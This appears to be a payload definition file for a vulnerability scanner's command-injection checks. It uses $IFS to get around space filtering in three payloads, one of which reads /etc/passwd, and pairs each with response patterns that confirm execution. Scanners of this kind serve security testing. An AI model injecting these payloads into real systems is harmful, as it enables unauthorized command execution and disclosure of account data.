; ===== Space Bypass with $IFS =====
[ifs_cat_passwd]
payload = ;cat${IFS}/etc/passwd
rules = root:
    /bin/bash
    /bin/sh
description = Command execution
status = vulnerability

[ifs_id]
payload = ;id${IFS}-a
rules = [SPACE]gid=
    [SPACE]uid=
description = Command execution
status = vulnerability

[ifs_ls]
payload = ;ls${IFS}-la
rules = total
    drwx
description = Command execution
status = vulnerability

